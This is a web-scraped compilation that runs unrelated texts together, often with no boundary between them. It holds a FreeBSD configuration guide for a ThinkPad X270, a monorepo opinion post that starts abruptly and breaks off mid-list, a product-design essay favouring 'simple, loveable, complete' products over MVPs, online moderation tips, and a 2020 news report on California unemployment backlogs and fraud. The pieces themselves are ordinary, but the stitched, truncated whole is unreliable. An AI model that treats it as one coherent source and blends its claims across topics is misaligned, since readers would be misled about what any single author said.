<p>The potential performance benefits of compression are significant, and the worst-case penalties are quite small. There are almost always better places to focus a sysadmin or storage architect’s attention than picking and choosing which datasets to disable compression on, so we …</p></div></div></div>

<h3 id="trackpoint">TrackPoint</h3>
<p>You may want to disable the Touchpad in BIOS in order to use the TrackPoint of the X270.
Install <code>x11-servers/xorg-server</code> with <code>udev</code> support and
<code>x11-drivers/xf86-input-libinput</code>. For evdev support, add:</p>

<pre><code># echo 'kern.evdev.rcpt_mask="12"' &gt;&gt; /etc/sysctl.conf</code></pre>

<p>Also, enable the TrackPoint by:</p>

<pre><code># echo 'hw.psm.trackpoint_support="1"' &gt;&gt; /boot/loader.conf</code></pre>

<p>If desired, enable the Trackpad with:</p>

<pre><code># echo 'hw.psm.synaptics_support="1"' &gt;&gt; /boot/loader.conf</code></pre>

<p>You can change the mouse acceleration with <code>x11/xinput</code> (values
between [-1.0, 1.0]):</p>

<pre><code>$ xinput set-prop 9 "libinput Accel Speed" 0.05</code></pre>

<p>Add the line to your <code>~/.xsession</code> to make the changes
permanent.</p>

<h3 id="power-management">Power Management</h3>
<p>For power management, you can either use <code>powerd(8)</code> or
<code>sysutils/powerdxx</code>. To enable <code>powerd</code>, edit
<code>/etc/rc.conf</code> and add:</p>

<pre><code>powerd_enable="YES"
powerd_flags="-a hiadaptive -b adaptive"
performance_cx_lowest="C2"</code></pre>

<p>Or, install <a href="https://github.com/lonkamikaze/powerdxx">powerd++</a>
with:</p>

<pre><code># pkg install powerdxx
# sysrc powerdxx_enabled="YES"</code></pre>

<h3 id="suspend-resume">Suspend/Resume</h3>
<p>While hibernate fails, suspend/resume works on the X270. You can test the
power management with:</p>

<pre><code># acpiconf -s 3</code></pre>

<p>This should perform a suspend to RAM. Press the power button to resume.
Install <code>security/doas</code> to suspend with non-root privileges. Edit
<code>/usr/local/etc/doas.conf</code> and add:</p>

<pre><code>permit nopass &lt;username&gt; as root cmd /usr/sbin/zzz</code></pre>

<p>Edit your <code>.cshrc</code> and define a new alias:</p>

<pre><code>alias zzz /usr/local/bin/doas /usr/sbin/zzz</code></pre>

<p>You can now suspend as a user by running <code>zzz</code>. Execute
<code>zzz</code> from your Window Manager by calling <code>tcsh -c
zzz</code>.</p>

<h3 id="audio">Audio</h3>
<p>Audio output is provided by the <code>snd_hda(4)</code> driver. Load the
kernel module at boot time by editing <code>/boot/loader.conf</code>:</p>

<pre><code>snd_hda_load="YES"</code></pre>

<p>Change between speakers and headphones manually:</p>

<pre><code># sysctl hw.snd.default_unit=1
hw.snd.default_unit: 0 -&gt; 1</code></pre>

<p>Device hints are required to make the switching work automatically
(todo).</p>

<h3 id="volume-keys">Volume Keys</h3>
<p>Load the <code>acpi_ibm(4)</code> kernel module to use the volume keys above
the keyboard.  Edit <code>/boot/loader.conf</code> and add:</p>

<pre><code>acpi_ibm_load="YES"</code></pre>

<p>Or add <code>kld_list+="acpi_ibm"</code> in <code>/etc/rc.conf</code>:</p>

<pre><code># sysrc kld_list+="acpi_ibm"</code></pre>

<p>Raising and lowering the volume using the volume keys will work now in
applications like VLC.  You have to configure your Window Manager to map
keypress events. For FVWM, add to <code>~/.fvwm/config</code>:</p>

<pre><code>Key XF86AudioRaiseVolume A A Exec exec mixer vol +10
Key XF86AudioLowerVolume A A Exec exec mixer vol -10</code></pre>

<p>After restarting FVWM, the volume keys can be used to change the soundcard
mixer values.</p>

<h3 id="screen">Screen</h3>
<p>Install and enable <code>graphics/drm-kmod</code>:</p>

<pre><code># pkg install graphics/drm-kmod
# sysrc kld_list+="/boot/modules/i915.kms.ko"</code></pre>

<p>You can connect an external screen by HDMI or USB-C (DisplayPort). Use
<code>x11/xrandr</code> to enable video output and set display resolutions.
The default output is <code>eDP-1</code>. List all outputs with:</p>

<pre><code>$ xrandr
Screen 0: minimum 320 x 200, current 1920 x 1080, maximum 8192 x 8192
eDP-1 connected 1920x1080+0+0 (normal left inverted right x axis y axis) 276mm x 155mm

HDMI-1 disconnected (normal left inverted right x axis y axis)
DP-2 disconnected (normal left inverted right x axis y axis)
HDMI-2 disconnected (normal left inverted right x axis y axis)</code></pre>

<p>Set the resolution of the HDMI output with:</p>

<pre><code>$ xrandr --output HDMI-1 --mode 1920x1080</code></pre>

<h3 id="screen-brightness">Screen Brightness</h3>
<p>Set the screen brightness with:</p>

<pre><code># sysctl hw.acpi.video.lcd0.brightness=80</code></pre>

<p>You can use the Fn keys to increase/decrease the screen brightness by loading
<code>acpi_ibm(4)</code>. Add to <code>/boot/loader.conf</code>:</p>

<pre><code>acpi_ibm_load="YES"</code></pre>

<p>Or add <code>kld_list+="acpi_ibm"</code> to <code>/etc/rc.conf</code>.</p>

<h3 id="wifi">Wi-Fi</h3>
<p>Wi-Fi is supported by the <code>iwm(4)</code> driver. Add the following lines
to <code>/boot/loader.conf</code>:</p>

<pre><code>if_iwm_load="YES"
wlan_ccmp_load="YES"
wlan_tkip_load="YES"</code></pre>
<p>Assumed your WiFi uses the WPA2 protocol, add the network to
<code>/etc/wpa_supplicant.conf</code>:</p>
<pre><code>network={
    ssid="Your WiFi"
    psk="correcthorsebatterystaple"
    key_mgmt=WPA-PSK
}</code></pre>

<p>Create a new wireless LAN device with:</p>

<pre><code># ifconfig wlan0 create wlandev iwm0</code></pre>

<p>You can add the device to <code>/etc/rc.conf</code>:</p>

<pre><code># sysrc wlans_iwm0="wlan0"</code></pre>

<p>Scan for networks with:</p>

<pre><code># ifconfig wlan0 up scan</code></pre>

<p>For better signal quality add your country code, for instance:</p>

<pre><code># ifconfig wlan0 country DE</code></pre>

<p>Connect to your Wi-Fi network:</p>

<pre><code># wpa_supplicant -i wlan0 -c /etc/wpa_supplicant.conf -B</code></pre>

<p>Obtain an IP address with:</p>

<pre><code># dhclient wlan0</code></pre>

<p>Optionally, set a custom DNS:</p>

<pre><code># echo "nameserver 8.8.8.8" &gt; /etc/resolv.conf</code></pre>

<p>You should be connected now. For more information on Wi-Fi networks, see the
<a href="https://www.freebsd.org/doc/handbook/network-wireless.html">FreeBSD online handbook</a>.</p>

<h3 id="sd-card-reader">SD-Card Reader</h3>
<p>Install the (experimental) kernel module <code>sysutils/rtsx-kmod</code> that
has been ported from OpenBSD and supports the Realtek RTS522A:</p>

<pre><code># pkg install sysutils/rtsx-kmod</code></pre>

<p>Then, add the module to your <code>kld_list</code> entry in
<code>/etc/rc.conf</code>:</p>

<pre><code>kld_list+="/boot/modules/rtsx.ko"</code></pre>

<p>Restart the system or load the module manually with:</p>

<pre><code># kldload rtsx</code></pre>

<p>Mount a FAT32-formatted SD card with, for example:</p>

<pre><code># mount_msdosfs /dev/mmcsd0s1 /mnt</code></pre>

<p>Before we start let me give some context on my background so that you can better understand my thoughts on Monorepo.&nbsp;</p>



<p>I head technology at an IT services organization. Most of the products that I build are using Microservices architecture, have multiple frontends(web and mobile). The biggest product that I recently built had close to 30 microservices, 1 web client written in React,&nbsp; and native mobile app built using React Native. These numbers are nowhere near the numbers big product companies have shared.&nbsp;</p>



<blockquote><p>I prefer Macroservices over Microservices. I think most products don’t need more than 10 microservices.&nbsp;</p></blockquote>



<p>The reason I am clearly specifying I belong to the IT services world is because most of the stuff we consume on software development is written by engineers and senior tech people at the product companies. The stuff they write and share is based on the real problems and challenges they face at work. There are times when those problems resonate with problems other software engineers face at their work but there are times they are solutions to the problems we don’t have. So, we have to look at these solutions from the lens of our problems.</p>



<blockquote><p>The post is based on my experience building software, leading and managing software delivery teams, and learning from the great articles written by engineers using Monorepos. Please refer to the references section for good resources on monorepos.</p></blockquote>



<p>Let’s get back to the topic at hand.</p>



<h2>So, what is a Monorepo?</h2>



<p>A monorepo is a software development strategy where a single version control repository has source code for multiple projects, libraries, and applications irrespective of their programming language. Also, the organizations using Monorepo strategy often use a common build tool (like Bazel, Pants, Buck) to manage all the source code. Some of the popular examples of organizations that employ monorepo strategy are Google, Facebook, Twitter, Microsoft, and Uber.&nbsp;</p>



<p>The alternative to monorepo is polyrepo/multirepo. In multirepo, you have a separate version control repository for each component. This is the common strategy used by most organizations to structure their code. This in my view has been largely driven by Microservices architecture style and small modules movement.</p>



<p>As mentioned in the paper[1] (Advantages and Disadvantages of a Monolithic Repository – A case study at Google), Monorepos have following properties:</p>



<ul><li><strong>Centralization</strong>: The codebase is contained in a single repo encompassing multiple projects.</li><li><strong>Visibility</strong>: Code is viewable and searchable by all engineers in the organization.</li><li><strong>Synchronization</strong>: The development process is trunk-based; engineers commit to the head of the repo.</li><li><strong>Completeness</strong>: Any project in the repo can be built only from dependencies also checked into the repo. Dependencies are unversioned; projects must use whatever version of their dependency is at the repo head.</li><li><strong>Standardization</strong>: A shared set of tooling governs how engineers interact with the code, including building, testing, browsing, and reviewing code.</li></ul>



<p>My understanding is that to successfully use monorepo you will have to satisfy all the properties. Otherwise, you will not get benefits intended from monorepo.&nbsp;</p>



<h2>Advantages of Monorepos</h2>



<p>There are valid reasons why many big product organizations prefer Monorepo. Following are the main reasons:</p>



<h3>Reason 1: Simplified dependency management</h3>



<p>Monorepos make dependency management simple by:</p>



<ol><li>You can easily depend on other projects/modules in a monorepo without the need for artifact management tools like Nexus, Artifactory etc.</li><li>You avoid diamond dependency problem. Diamond dependences occur when a project has two dependencies which depend on the same underlying library. When a developer upgrades a dependency, they run the risk of breaking a diamond in the dependency graph.</li><li>It is easier to keep all dependencies on the same version by using a centralized way to manage version numbers.</li></ol>



<p>This is simplified further by using a single build tool. I have not used Bazel, Bucks, or Pants. I was watching a talk on Twitter monorepo journey where they talked about Gradle being too slow for their use case. For the size of applications I have built Gradle has worked just fine.</p>



<h3>Reason 2: Code sharing and reusability</h3>



<p>The second big benefit of Monorepo is that developers can share code across projects. It is easier to enforce best practices across the code base by using monorepo. Another related point is that with monorepo we don’t end up creating silos. This is important in an enterprise setup because it leads to passing the buck and bugs falling through the cracks of the boundaries. In my experience with multirepo setup people only care about their Microservice running fine. They miss the point that value is achieved by integrating the software and collaboration. In IT service organizations where there is more bureaucracy and uneven distribution of skilled developers the problem scales very quickly with multirepo setup. Yes, I know it is a culture problem but most IT service organizations can’t burn investor dollars to build the culture.</p>



<h3>Reason 3: Atomic changes</h3>



<p>This I didn’t realize before I read literature on Monorepo. There is a lot of benefit in seeing related changes in a single commit. If you are working on a story that requires changes in multiple components then in a multirepo scenario you will have to see changes in multiple repositories and merge the PRs in some sequence so that you are in a healthy state. WIth monorepo you save the pain of trying to coordinate commits across multiple repositories. Also, this leads to better code reviews as all the changes are in one place.</p>



<h3>Reason 4: Large-scale code refactoring</h3>



<p>This is related to reason 3. With a monorepo, you can refactor the API and all of its callers in one commit. You see all the usages of an API at a single place and it is much easier to do than with multirepo where you might not even have all the code checked out. In my experience with multirepo setup most developers don’t keep all the repos updated with the upstream changes. Monorepos enables continuous improvement on global level that multirepo you do at local level.</p>



<h3>Reason 5: Less bureaucracy</h3>



<p>With some organizations I have worked at, you have to create ServiceNow tickets to create a repository. It can take a couple of days before you get your empty repository. With monorepo you don’t have to go through this pain.&nbsp;</p>



<h2>Disadvantages of Monorepo</h2>



<p>Nothing comes for free. There are always trade offs involved. Your job as a software engineer is to figure out if advantages weigh more than trade offs or not.&nbsp;</p>



<p>In my view following are the downsides of monorepo:</p>



<ol><li>Monorepos could slow down developers because of slow build times, poor tooling, and merge conflicts.&nbsp;<ol><li>Most developers still in 2020 struggle to cleanly merge code.&nbsp;</li><li>Git is slow for projects with large numbers of files and history.</li></ol></li><li>There is cognitive overhead involved as developers have to get comfortable with a much larger code base than they would have with multirepo setup.</li><li>To do monorepo well require investment in tooling that most organization non-tech leadership will fail to understand</li></ol>



<h2>So, what’s my view on monorepos?</h2>



<p>Before I talk about my views on Monorepo let’s understand three main constraints of IT services organization.&nbsp;</p>



<ol><li>We work with multiple customers so we can’t keep code of all customers in the same repository even when we host their code in our version control for obvious reasons. Also, we can’t give access to all our repositories to all our developers because of security and IP related issues. So, we will keep our discussion focused on how to manage repos for a single customer.</li><li>IT services organizations have a high ratio of junior(&lt; 5 years) to senior engineers(&gt; 10 years) somewhere in the range of 10:1 to 100:1 or may be higher in bigger IT service organizations. The reason I am bringing this point is that monorepos requires discipline and it is tough to achieve without senior engineers driving it using a well-defined process.</li><li>People come and go at a faster rate.</li></ol>



<p>Given the above two constraints and the disadvantages of monorepos it might seem that monorepos will not work for us. But, I see real problems faced by software delivery teams that can be solved by monorepos.</p>



<p>We build products for different customers. These products usually follow Microservice architecture, have multiple frontends – web and mobile, functional tests, scripts for deployment automation. In the multirepo strategy, you will create at minimum 5 repositories – 1 for backend with all microservices, 1 for SPA frontend, 1 or 2 repo for mobile depending on whether you are building pure native or using some native framework like React Native or Flutter, 1 for functional tests, 1 for deployment automation scripts.&nbsp; More often than not your team will use one repo per Microservice then only god knows how many repos you end up creating.</p>



<blockquote><p>Let me tell you a real story. I was once working with a client that had more than 1000 repositories in their version control system. They were using the Gitlab version control platform. They had 5 products and each product was made up of multiple Microservices. The first question I asked them was to help us understand which all services and their respective code repositories were part of product A. Their chief architect had to spent a day figuring out all the repositories that made the product A. After spend a day still she was not sure if she has covered all the services.</p></blockquote>



<p>Let’s discuss problems that I face with software delivery teams using the multirepo strategy. Just to reiterate these problems are in the context of a single customer.</p>



<ol><li>Lack of accountability: Humans are good at creating boundaries and silos. They don’t care what happens outside those boundaries. They don’t care about the bigger picture.</li><li>Version drift. 10 different versions of Spring Boot, three different JDK versions, …</li></ol></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div><h3 id="i-hate-the-term-mvp">I hate the term MVP.</h3>
<p>Over the past decade, it’s been overused and misunderstood to the point where something labeled as an MVP is automatically assumed to be pretty shit. Most MVPs are unfortunately too M to be V, and the culture of “ship it while you’re embarrassed by it” tends to lead to products providing users with an embarrassingly bad experience.</p>
<h3 id="the-problem-is-that-your-users-hate-mvps">The problem is that your users hate MVPs.</h3>
<p>Building products is a difficult and time-consuming effort. Figuring out what the problems, finding a potential solution to that problem, and then building that solution all take a decent chunk of time and effort. It’s due to this process that the minimum viable product was born. The motivation for building an MVP is still valid. Build something small and easy to test, launch quickly, and pivot or trash it if it doesn’t perform as desired.</p>
<p>There is another, less selfish way.</p>
<p>I read an <a href="https://blog.asmartbear.com/slc.html">article</a> by Jason Cohen a few years ago which changed the way I think about product development. Instead of building MVPs, we should be building SLCs. Something Simple, Loveable, and Complete.</p>
<h3 id="simple">Simple</h3>
<p>When something is simple, it is easier to modify, build on, and maintain (all of which are very important in the early stages of product development). This is different from something being minimal as something can be minimal but not simple. Conversely, few things are simple without being minimal. One of the pieces of feedback I get regularly for <a href="https://justsketch.me/">JustSketchMe</a> is how simple the interface is, and how easy it is to use. By having a small set of powerful tools we keep the simplicity of interaction while providing the ability to create complex scenes.</p>
<h3 id="loveable">Loveable</h3>
<p>Coming from game development, it has always been a priority of mine to ensure my creations elicit joy. It needs to be loveable. If people aren’t getting that “ooh, this is nice” feeling from your early-stage project, they’re unlikely to stick around. Both <a href="https://bearblog.dev/">Bear Blog</a> and <a href="https://somewordsfor.me/">Some words for me</a> were explicitly built to be loveable. From the copy to the way that the user interacts with them, everything is built with <a href="https://en.wikipedia.org/wiki/Marie_Kondo">Marie Kondo</a> in mind. (There’s even an Easter egg on the Bear Blog home page. Happy hunting!)</p>
<h3 id="complete">Complete</h3>
<p>This is the most important of the three traits. The product needs to be complete.</p>
<p>I don’t mean that your product cannot be worked on and expanded anymore. It means that the product is not reliant on additional features for it to be useful to your users. A good way to test this is to think: “If I don’t expand and improve this product anymore, will people still use it?”.
If we take a look at tech products that are doing fairly well, you’ll notice that most (if not all) of them were built as complete products initially. Twitter is so similar to the initial concept, while Facebook has morphed into something else entirely; but both products were completely useable in their inception.</p>
<p>To use one of my projects as an example again, <a href="https://justsketch.me/">JustSketchMe</a> started out with just 2 characters (male and female) and only one in the scene at a time. This was very useful and had I walked away from the project at that point, it would have still been complete. I have since built out the functionality to add many characters to the scene, along with props and saving to the cloud.</p>
<h3 id="design-by-subtraction">Design by subtraction</h3>
<p>With SLCs (as opposed to MVPs) the trick is to design by subtraction. My favourite example of this is the game <a href="https://en.wikipedia.org/wiki/Ico">Ico</a>. It’s a fetch quest game where you need to escort another character and prevent her from being dragged to the underworld by little beasties. The developers started out by designing combat, weapons, and upgrade systems. Loot systems. Health and damage counters. They then sat down to examine which features actually emphasise the core mechanic, and which ones do not. Long story short, they ended up removing almost all the systems we would traditionally see in a game like this. The character now has a stick that is used to fight off beasties (instead of a complex weapon/upgrade system). The character can’t even take damage. The lose state is if the character you’re escorting is dragged to the underworld.</p>
<p>This culminated in one of the best games of the generation. The developers went on to build the iconic Shadow of the Colossus using the same techniques.</p>
<h3 id="conclusion">Conclusion</h3>
<p>Here are some steps to think about when building your next project:</p>
<ol>
<li>Keep the feature-set small and manageable (as opposed to large and hastily built).</li>
<li>Make the product delightful to interact with.</li>
<li>Stay focused on the core idea of the project.</li>
<li>Have fun with it!</li>
</ol>

<p>Being an online community moderator takes an acute understanding of language and dialogue on a <em>(sometimes frustratingly)</em> nuanced level, all the while striving to understand the full context of something. Here’s a few things I’ve learned that I hope you find helpful to keep in mind! </p>

<p><a href="https://the.community.club/images/LnTDNO0ff4U3OHCUv9sS-n_WLSML9A-VoYrTL968V18/w:880/aHR0cHM6Ly9tZWRp/YS1leHAxLmxpY2Ru/LmNvbS9kbXMvaW1h/Z2UvQzU2MTJBUUh2/MEpFUlp6ZjM5QS9h/cnRpY2xlLWlubGlu/ZV9pbWFnZS1zaHJp/bmtfMTAwMF8xNDg4/LzA_ZT0xNjA5Mzcy/ODAwJnY9YmV0YSZ0/PUYtQ0pycEg0UFIz/dzhSRVRlajROd2xw/V1NpMV9HcHdiSkUz/aE9vTVNrU3c"><img src="https://the.community.club/images/LnTDNO0ff4U3OHCUv9sS-n_WLSML9A-VoYrTL968V18/w:880/aHR0cHM6Ly9tZWRp/YS1leHAxLmxpY2Ru/LmNvbS9kbXMvaW1h/Z2UvQzU2MTJBUUh2/MEpFUlp6ZjM5QS9h/cnRpY2xlLWlubGlu/ZV9pbWFnZS1zaHJp/bmtfMTAwMF8xNDg4/LzA_ZT0xNjA5Mzcy/ODAwJnY9YmV0YSZ0/PUYtQ0pycEg0UFIz/dzhSRVRlajROd2xw/V1NpMV9HcHdiSkUz/aE9vTVNrU3c" alt="Ad Hominem Attacks" loading="lazy"></a></p>



<p>To start off with, I dislike the term “Ad Hominem” for many reasons, and I prefer “personal attack”. Folks may not easily understand Latin (it’s been a long time since latin class for me) and it is rooted in gendered language.</p>

<p>This can be surprisingly tricky, but no one should attack anyone’s immutable traits or characteristics. Make sure the focus of the argument, comment or criticism is on the action, or idea rather than an insult to an individual or person/s.</p>

<p><a href="https://the.community.club/images/Ae3NlIMVgvWYWRalQegNO4FcFScqEHBGmNC3A8rFMwc/w:880/aHR0cHM6Ly9tZWRp/YS1leHAxLmxpY2Ru/LmNvbS9kbXMvaW1h/Z2UvQzU2MTJBUUcw/aDN4azgzVGNoZy9h/cnRpY2xlLWlubGlu/ZV9pbWFnZS1zaHJp/bmtfMTAwMF8xNDg4/LzA_ZT0xNjA5Mzcy/ODAwJnY9YmV0YSZ0/PThMZFFVN1FGZlpv/WTkyem5PTl9YWVV4/eEZlMm5tcG1qb21p/dWhORWllVG8"><img src="https://the.community.club/images/Ae3NlIMVgvWYWRalQegNO4FcFScqEHBGmNC3A8rFMwc/w:880/aHR0cHM6Ly9tZWRp/YS1leHAxLmxpY2Ru/LmNvbS9kbXMvaW1h/Z2UvQzU2MTJBUUcw/aDN4azgzVGNoZy9h/cnRpY2xlLWlubGlu/ZV9pbWFnZS1zaHJp/bmtfMTAwMF8xNDg4/LzA_ZT0xNjA5Mzcy/ODAwJnY9YmV0YSZ0/PThMZFFVN1FGZlpv/WTkyem5PTl9YWVV4/eEZlMm5tcG1qb21p/dWhORWllVG8" alt="Straw Man (aka Straw Person) Argument" loading="lazy"></a></p>



<p>A straw man argument is mischaracterizing or misrepresenting someone’s position. This can be done with the intent of deceiving, or by purposefully oversimplifying a nuanced position, which can be to try to make it easier to critique. The position is meant to resemble the original claim (like a person made of straw) — but it’s not actually the real thing, or claim.</p>

<p>While this can happen unintentionally, often times it can be done on purpose. They may bring up something that the person was never really arguing in the first place. You have to really pay attention to the original claim/s.</p>

<p>Often, you can see both the strawman arguments and ad hominem attacks occur together — in that they would try to discredit, while also trying to disparage someone’s views. </p>

<p>The Streisand Effect (yes, named after THE Barbra Streisand) can be simply understood that by trying not to draw attention to something, it garners more interest and attention to it.</p>

<p>So, be wary that if you comment, remove, ignore [insert x action here] that you may be inadvertently drawing more attention to the thing. It’s a risk that you should consider and the consequences of such should inform your actions.</p>

<p>Broad generalization is mostly based on a hypothetical, and tends to not target anything specifically. Generalizing is lacking any qualifiers and significant evidence to backup a claim, which can risk stereotyping or being simply incorrect.</p>

<p>You will need to pay close attention to when it may cross the line into stereotyping or being harmful. But, I’ve seen that adding the right qualifiers can often turn a generalization into a responsible or credible claim.</p>

<p>Are you creating more surface area for yourself? And by surface area I mean, are you making it harder on yourself, giving too much away or adding too much detail when you don’t need to in order to accomplish your goals? </p>

<p>While it is good to be thorough, fair and transparent, often times we over explain, or add in things that may distract from the overall goal and point, which can open us up for additional arguments and problems. </p>

<p>Focus on being to the point, in as clear and simple way as you can. Then, once you’ve tackled one piece, you can add on complexity, details or more asks. For example: when asking for resources or pitching new ideas this can come in the form of successional buy-in, this can also useful when explaining moderation decision/s.</p>

<p>AKA — get to the point right away! No TL;DR needed.</p>

<p>It’s important to respect your communities, and the readers, time and energy. You do this by focusing on what’s important to the reader first, while postponing other essential points or facts second. A bad example? All those cooking blogs that tell their life story at the beginning when all we want is the recipe and list of ingredients — which is always at the end.</p>

<p><a href="https://the.community.club/images/I_Ki4uByHm-NMLRnTdj3SgmrSd_2w_FG-0g8k2XvjEg/w:880/aHR0cHM6Ly9tZWRp/YS1leHAxLmxpY2Ru/LmNvbS9kbXMvaW1h/Z2UvQzU2MTJBUUUz/Wkhmdl93Q2Vkdy9h/cnRpY2xlLWlubGlu/ZV9pbWFnZS1zaHJp/bmtfMTAwMF8xNDg4/LzA_ZT0xNjA5OTc3/NjAwJnY9YmV0YSZ0/PVhteGNxelVmblBM/bUhvcDBSbjZPVU5q/cWoycWN0WWNEV0FG/T1NxTzZ4MVU"><img src="https://the.community.club/images/I_Ki4uByHm-NMLRnTdj3SgmrSd_2w_FG-0g8k2XvjEg/w:880/aHR0cHM6Ly9tZWRp/YS1leHAxLmxpY2Ru/LmNvbS9kbXMvaW1h/Z2UvQzU2MTJBUUUz/Wkhmdl93Q2Vkdy9h/cnRpY2xlLWlubGlu/ZV9pbWFnZS1zaHJp/bmtfMTAwMF8xNDg4/LzA_ZT0xNjA5OTc3/NjAwJnY9YmV0YSZ0/PVhteGNxelVmblBM/bUhvcDBSbjZPVU5q/cWoycWN0WWNEV0FG/T1NxTzZ4MVU" alt="Bikeshedding" loading="lazy"></a></p>



<p>AKA the Law of triviality, is where folks tend to spend time and energy in a discussion around a seemingly marginal or trivial issue. It can also be seen as procrastination.</p>

<p>Don't just dismiss feedback as bikeshedding without digging in to ensure you've considered the other folks perspective, and allowed them to communicate their reasoning. Calling something out as bikeshedding can also be used to silent minority opinions or try to change the topic - it's important to make sure folks are heard and not just dismissed. On the other hand, sometimes it's an easy indulgence to focus on unimportant details while crucial matters go unattended. </p>

<p>At the end of the day, you will have to weigh how much work and time should be put into decisions, and to make sure everyone is heard while also considering all possibilities and their tradeoffs fairly.</p>

<p>From May to June, the unemployment applications of 1.3 million out-of-work people in California were set aside for state workers to review, an arduous process that delayed benefits for weeks or even longer.&nbsp;</p><p>Now, California is among a growing number of states using software to automate more of the unemployment insurance application process, with the goal of more quickly getting payments to the people who need them.&nbsp;</p><p>The automated identity verification tool is just one step the state has taken in recent weeks to try and get the problem under control.</p><p>A “strike team” appointed by Gov. Gavin Newsom last month released <a href="https://www.govops.ca.gov/wp-content/uploads/sites/11/2020/09/Assessment.pdf" target="_blank">a 103-page report</a> with recommendations for the Employment Development Department. Most drastically, the agency followed advice to shut down new applications for two weeks in September, allowing employees&nbsp; to catch up on the growing backlog of cases that had been waiting for at least 21 days for resolution.&nbsp;</p><p>But even with that reset, EDD has a long way to go. Agency staff reported that during the two-week break they were able to go through 246,000 cases out of a backlog that climbed to 1.6 million by early fall, although <a href="https://edd.ca.gov/About_EDD/pdf/news-20-58.pdf" target="_blank">a recent report</a> shows they continue to make progress. The agency earlier this month told frustrated state lawmakers that it will need until January to fully clear out the rest.</p><p>California isn’t alone in dealing with <a href="https://www.route-fifty.com/management/2020/07/unemployment-states-problems-coronavirus-delays-benefits/166817/">massive unemployment system problems</a> that have resulted in people eligible for benefits just not getting them. As nationwide unemployment hit a high of nearly 15% in April and Congress created a new program to allow self-employed workers to receive assistance, agencies struggled to process applications and get checks to desperate families.&nbsp;</p><p>In March, as the pandemic was just starting to affect unemployment numbers, nearly 95% of unemployment applicants nationwide received payments within two weeks of applying—the U.S. Labor Department’s benchmark for timeliness for states like California that require a waiting week before applications receive benefits—but by June, the rate was less than 45%. In September, the nationwide average was 53%.&nbsp;</p><p>In California, the strike team report, written by Yolanda Richardson, the state’s government operations secretary, and Jennifer Pahlka, a former U.S. Deputy Chief Technology Officer under President Obama, found that manual reviews to confirm applicants’ identities created a bottleneck that slowed payments, without meaningfully preventing fraud. While about 60% of claims are approved automatically, the remaining claims that require manual reviews are the largest factor slowing payments well beyond federal standards for timeliness.</p><p>Of the applications that require manual review, 78% were due to a problem identifying the claimant’s identity, according to the report. Part of the issue in California and other states was just the volume of claims as the pandemic and associated shutdowns started to ripple through the economy. Nationally, initial claims for unemployment benefits rocketed from about 225,000 per week in March 2019 to 6.9 million in one week in March 2020.&nbsp;</p><p>“What states need is automation to deal with their backlogs,” said Waldo Jaquith, who leads the unemployment insurance team at U.S. Digital Response, a group that provides free technology assistance to governments across the country. “States have received more applications than they possibly have the staff to deal with. They can’t even staff up to the appropriate levels.”</p><p>The California EDD contracted the vendor ID.me to automate its system this month. When applicants file for benefits, the system will allow them to upload identification documents, as well as a photo they take through the system. The idea is to both make for a quicker process and curtail fraud, the<a href="https://edd.ca.gov/About_EDD/pdf/news-20-49.pdf" target="_blank"> agency has said</a>.&nbsp;</p><p>After the company’s first day operating in the state on Oct. 6, the agency processed 64% of applications automatically. The September report found the previous average to be about 60% and said a vendor could help that number reach 91%.&nbsp;</p><p>At a California Assembly hearing on Oct. 7, Democratic Assemblymember David Chiu said he remained concerned there is still a long way to go. But by Thursday, EDD reported that automatic verification was now processing 85% of claims.</p><p>ID.me did not return a message seeking comment. On its website, the company advertises recent work for Arizona, Georgia, Nevada and Pennsylvania in addition to California. Jaquith said ID.me is one of two or three companies providing a similar service.&nbsp;</p><p><strong>Fraud Failures</strong></p><p>Automation is not a panacea for all unemployment insurance problems.</p><p>Jennifer Kwart, a spokeswoman for Chiu, said in an interview that although Chiu has confidence in the authors of the report, the California EDD still needs to improve its outreach and accessibility. Non-native English speakers, disabled users and people who use only mobile devices for internet access have difficulty signing up for benefits, she said.&nbsp;&nbsp;</p><p>The strike team report also identified a significant EDD staffing problem. While the state went on a hiring binge, these new employees lack the training and expertise to tackle the stacked-up cases. On top of this, the team found that experienced staffers were being tasked with training the new employees, which meant the agency had actually become less productive.&nbsp;</p><p>Going forward, EDD has pledged to redirect experienced staff from training duties or answering phones, saying they would instead be focused on resolving past cases.&nbsp;</p><p>California’s automation efforts with ID.me also won’t itself be enough to stop the kind of systemic fraud that has plagued unemployment systems across the country during the pandemic, the report says.&nbsp;</p><p>In just one example, Arizona <a href="https://www.azcentral.com/story/money/business/consumers/2020/10/12/unemployment-fraud-arizona-freezes-43-000-accounts-second-action/5954064002/" target="_blank">has estimated</a> it paid out $500 million in fraudulent claims. Federal authorities also believe a criminal ring based out of Nigeria used stolen Social Security numbers and other pieces of information to submit fraudulent claims across the country. Washington state alone believes it made $576 million in payments to these scammers and have so far recovered $346 million, the <a href="https://www.nytimes.com/2020/10/01/business/economy/unemployment-benefits-fraud.html" target="_blank"><em>New York Times</em> reported.</a>&nbsp;</p><p>While automated systems seem to be at least as good as employees at catching such fraud, states are viewing them as tools to get through their backlogs. Improving fraud protection hasn’t “even been part of the calculus,” Jaquith said.&nbsp;</p><p>Along with creating headaches for agency staff, fraud is a major problem for the people who depend on unemployment insurance and other state benefits, said Jessica Bartholow, a policy advocate at the Sacramento-based legal advocacy group Western Center on Law and Poverty.</p><p>When fraudsters gain access to a claimant’s identity to secure unemployment payments, it robs the person who is entitled to that aid and can even cut off other benefits like food stamps, Bartholow said. It’s also more likely to hurt disabled people, homeless people and others who are in the greatest need.</p><p>In California, EDD this month <a href="https://www.latimes.com/california/story/2020-10-22/california-debit-cards-frozen-unemployment-benefits-fraud" target="_blank">froze 350,000 debit cards</a> containing benefits because of fraud concerns, including multiple applications at one address. For people with legitimate benefits caught up in the freeze, they will have to work out the problem with the bank or EDD, the <a href="https://edd.ca.gov/About_EDD/pdf/news-20-52.pdf" target="_blank">state agency said</a>.&nbsp;</p><p>“I would qualify that as a serious problem,” Bartholow said. “This is not pretend. This is real fraud.”</p><p>But existing systems just don’t have much of a response to these types of schemes. State unemployment systems generally have strong methods of catching individuals who lie about their own situation to boost their benefits, but are less prepared to stop the wide scale fraud efforts that are much more costly to states.&nbsp;</p><p>“The ‘gotcha’ approach to a lot of state UI systems is optimized to the mythical welfare queen and not to who is actually doing the stealing, which is organized crime rings stealing vast amounts of money,” Jaquith said.<svg>

<h2>Programmatically Identifying Political Media <span> (Posted on November 2<sup>nd</sup>, 2020)</span></h2>
